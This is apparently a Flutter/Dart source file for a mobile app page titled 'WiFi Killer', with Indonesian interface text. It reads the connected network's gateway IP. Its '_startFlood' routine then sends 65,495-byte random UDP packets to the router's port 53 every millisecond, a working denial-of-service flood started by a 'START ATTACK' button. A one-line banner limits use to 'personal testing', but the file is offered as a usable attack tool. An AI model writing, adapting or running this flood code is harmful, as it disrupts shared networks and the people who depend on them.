// WIFI_EXTERNAL.DART

import 'dart:async';
import 'dart:io';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:network_info_plus/network_info_plus.dart';

// ─── TEMA WARNA PUTIH X BIRU NEW ──────────────────────────────────────────
class _C {
  static const bg         = Color(0xFFE8EDF2);
  static const surface    = Color(0xFFFFFFFF);
  static const card       = Color(0xFFFFFFFF);
  static const border     = Color(0xFFD4DCE4);
  static const borderLit  = Color(0xFFCBD5E1);

  static const blue       = Color(0xFF1A73E8);
  static const blueMid    = Color(0xFF4285F4);
  static const blueLight  = Color(0xFF8AB4F8);
  static const blueFrost  = Color(0xFFC2D8F8);
  static const blueDark   = Color(0xFF1557B0);

  static const green      = Color(0xFF34A853);
  static const amber      = Color(0xFFFBBC04);
  static const red        = Color(0xFFEA4335);
  static const orange     = Color(0xFFFB8B24);

  static const text       = Color(0xFF202124);
  static const textSub    = Color(0xFF5F6368);
  static const textDim    = Color(0xFF9AA0A6);
  static const white      = Color(0xFFFFFFFF);

  static const LinearGradient primaryGrad = LinearGradient(
    colors: [Color(0xFF1A73E8), Color(0xFF4285F4)],
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
  );
}

class WifiKillerPage extends StatefulWidget {
  const WifiKillerPage({super.key});

  @override
  State<WifiKillerPage> createState() => _WifiKillerPageState();
}

class _WifiKillerPageState extends State<WifiKillerPage> {
  String ssid = "-";
  String ip = "-";
  String frequency = "-";
  String routerIp = "-";
  bool isKilling = false;
  Timer? _loopTimer;

  // ─── 3D TEXT (MINECRAFT STYLE) ─────────────────────────────────────────────
  Widget _build3DText(String text, {double size = 16, Color? color}) {
    final textColor = color ?? _C.blue;
    return Stack(
      children: [
        Text(
          text,
          style: TextStyle(
            fontSize: size,
            fontWeight: FontWeight.w900,
            color: Colors.black.withOpacity(0.12),
            letterSpacing: 1,
          ),
        ),
        Transform.translate(
          offset: const Offset(-1.5, -1.5),
          child: Text(
            text,
            style: TextStyle(
              fontSize: size,
              fontWeight: FontWeight.w900,
              color: Colors.white.withOpacity(0.3),
              letterSpacing: 1,
            ),
          ),
        ),
        Transform.translate(
          offset: const Offset(-3, -3),
          child: Text(
            text,
            style: TextStyle(
              fontSize: size,
              fontWeight: FontWeight.w900,
              color: textColor,
              letterSpacing: 1,
              shadows: [
                Shadow(
                  color: textColor.withOpacity(0.3),
                  blurRadius: 12,
                  offset: const Offset(0, 3),
                ),
              ],
            ),
          ),
        ),
      ],
    );
  }

  @override
  void initState() {
    super.initState();
    _loadWifiInfo();
  }

  Future<void> _loadWifiInfo() async {
    final info = NetworkInfo();

    final status = await Permission.locationWhenInUse.request();
    if (!status.isGranted) {
      _showAlert("Permission Denied", "Akses lokasi diperlukan untuk membaca info WiFi.");
      return;
    }

    try {
      final name = await info.getWifiName();
      final ipAddr = await info.getWifiIP();
      final gateway = await info.getWifiGatewayIP();

      setState(() {
        ssid = name ?? "-";
        ip = ipAddr ?? "-";
        routerIp = gateway ?? "-";
        frequency = "-";
      });

      print("Router IP: $routerIp");
    } catch (e) {
      setState(() {
        ssid = ip = frequency = routerIp = "Error";
      });
    }
  }

  void _startFlood() {
    if (routerIp == "-" || routerIp == "Error") {
      _showAlert("❌ Error", "Router IP tidak tersedia.");
      return;
    }

    setState(() => isKilling = true);
    _showAlert("✅ Started", "WiFi Killer!\nStop Manually.");

    const targetPort = 53;
    final List<int> payload = List<int>.generate(65495, (_) => Random().nextInt(256));

    _loopTimer = Timer.periodic(Duration(milliseconds: 1), (_) async {
      try {
        for (int i = 0; i < 2; i++) {
          final socket = await RawDatagramSocket.bind(InternetAddress.anyIPv4, 0);
          for (int j = 0; j < 9; j++) {
            socket.send(payload, InternetAddress(routerIp), targetPort);
          }
          socket.close();
        }
      } catch (_) {}
    });
  }

  void _stopFlood() {
    setState(() => isKilling = false);
    _loopTimer?.cancel();
    _loopTimer = null;
    _showAlert("🛑 Stopped", "WiFi flood attack dihentikan.");
  }

  void _showAlert(String title, String message) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: _C.surface,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: title.contains('✅') ? _C.green.withOpacity(0.3) : _C.red.withOpacity(0.3)),
        ),
        title: _build3DText(title, size: 16, color: title.contains('✅') ? _C.green : _C.red),
        content: Text(
          message,
          style: TextStyle(
            color: _C.textSub,
            fontSize: 14,
          ),
        ),
        actions: [
          Center(
            child: Container(
              decoration: BoxDecoration(
                gradient: _C.primaryGrad,
                borderRadius: BorderRadius.circular(12),
                boxShadow: [
                  BoxShadow(
                    color: _C.blue.withOpacity(0.3),
                    blurRadius: 8,
                    offset: const Offset(0, 2),
                  ),
                ],
              ),
              child: TextButton(
                onPressed: () => Navigator.pop(context),
                child: Text("OK", style: TextStyle(color: _C.white, fontWeight: FontWeight.bold)),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _infoRow(String label, String value) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 4),
      child: Row(
        children: [
          Text("$label: ", style: TextStyle(color: _C.textSub, fontWeight: FontWeight.bold)),
          Expanded(child: Text(value, style: TextStyle(color: _C.text, fontFamily: 'monospace'))),
        ],
      ),
    );
  }

  @override
  void dispose() {
    _stopFlood();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _C.bg,
      appBar: AppBar(
        backgroundColor: _C.surface,
        elevation: 0,
        bottom: PreferredSize(
          preferredSize: const Size.fromHeight(1),
          child: Container(height: 1, color: _C.border),
        ),
        leading: IconButton(
          icon: Icon(Icons.arrow_back_ios_new_rounded, color: _C.textSub),
          onPressed: () => Navigator.pop(context),
        ),
        title: _build3DText("WiFi Killer", size: 18),
        centerTitle: true,
      ),
      body: Padding(
        padding: const EdgeInsets.all(20),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            _build3DText("Network Analysis", size: 18, color: _C.blue),
            const SizedBox(height: 8),
            Container(
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                color: _C.amber.withOpacity(0.06),
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: _C.amber.withOpacity(0.2)),
              ),
              child: Text(
                "⚠️ Feature ini mampu mematikan jaringan WiFi yang anda sambung.\nGunakan hanya untuk testing pribadi.",
                style: TextStyle(color: _C.textSub, fontSize: 13, height: 1.5),
              ),
            ),
            const SizedBox(height: 20),

            // ─── INFO CARD ────────────────────────────────────────────────────
            Container(
              decoration: BoxDecoration(
                color: _C.surface,
                borderRadius: BorderRadius.circular(16),
                border: Border.all(color: _C.border),
                boxShadow: [
                  BoxShadow(
                    color: Colors.black.withOpacity(0.04),
                    blurRadius: 10,
                    offset: const Offset(0, 5),
                  ),
                  BoxShadow(
                    color: Colors.white.withOpacity(0.6),
                    blurRadius: 8,
                    offset: const Offset(-2, -2),
                  ),
                ],
              ),
              padding: const EdgeInsets.all(20),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  _infoRow("SSID", ssid),
                  _infoRow("IP Address", ip),
                  _infoRow("Frequency", "$frequency MHz"),
                  _infoRow("Router IP", routerIp),
                ],
              ),
            ),

            const SizedBox(height: 32),

            // ─── ACTION BUTTON ────────────────────────────────────────────────
            SizedBox(
              width: double.infinity,
              height: 54,
              child: Container(
                decoration: BoxDecoration(
                  gradient: isKilling 
                      ? LinearGradient(colors: [_C.red, _C.red.withOpacity(0.8)])
                      : _C.primaryGrad,
                  borderRadius: BorderRadius.circular(16),
                  boxShadow: [
                    BoxShadow(
                      color: isKilling 
                          ? _C.red.withOpacity(0.3) 
                          : _C.blue.withOpacity(0.35),
                      blurRadius: 16,
                      offset: const Offset(0, 4),
                    ),
                    BoxShadow(
                      color: Colors.white.withOpacity(0.6),
                      blurRadius: 8,
                      offset: const Offset(-2, -2),
                    ),
                  ],
                ),
                child: ElevatedButton.icon(
                  onPressed: isKilling ? _stopFlood : _startFlood,
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Colors.transparent,
                    shadowColor: Colors.transparent,
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(16),
                    ),
                  ),
                  icon: Icon(
                    isKilling ? Icons.stop : Icons.wifi_off, 
                    color: _C.white, 
                    size: 22,
                  ),
                  label: Text(
                    isKilling ? "STOP ATTACK" : "START ATTACK",
                    style: TextStyle(
                      fontSize: 15,
                      letterSpacing: 1.5,
                      color: _C.white,
                      fontWeight: FontWeight.w800,
                    ),
                  ),
                ),
              ),
            ),

            const SizedBox(height: 20),

            if (isKilling)
              Center(
                child: Column(
                  children: [
                    const SizedBox(
                      width: 30,
                      height: 30,
                      child: CircularProgressIndicator(
                        color: _C.blue,
                        strokeWidth: 2.5,
                      ),
                    ),
                    const SizedBox(height: 10),
                    Text(
                      "Sending Packets...",
                      style: TextStyle(
                        color: _C.textSub,
                        fontFamily: 'monospace',
                        fontSize: 13,
                      ),
                    ),
                  ],
                ),
              ),
          ],
        ),
      ),
    );
  }
}